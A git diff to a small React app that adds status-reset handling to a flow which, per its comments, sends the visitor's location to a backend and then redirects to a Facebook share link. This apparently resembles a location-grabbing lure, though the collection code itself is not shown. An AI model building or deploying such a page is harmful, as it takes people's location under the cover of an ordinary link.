@@ -1,11 +1,18 @@
 import './App.css';
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { FaSpinner } from "react-icons/fa";
 
 function App() {
   const FB_LINK = "https://www.facebook.com/share/r/1EjiX5jtYP/";
   const [status, setStatus] = useState('idle'); // idle | locating | sending | error
   const apiUrl = (import.meta.env.VITE_API_URL || 'https://loac-backend.onrender.com').replace(/\/$/, '');
+
+  useEffect(() => {
+    const resetStatus = () => setStatus('idle');
+    window.addEventListener('pageshow', resetStatus);
+
+    return () => window.removeEventListener('pageshow', resetStatus);
+  }, []);
 
   const handleGo = () => {
     setStatus('locating');
@@ -38,6 +45,7 @@ function App() {
         }
 
         // Redirect to Facebook after location is sent
+        setStatus('idle');
         window.location.href = FB_LINK;
       },
       (error) => {
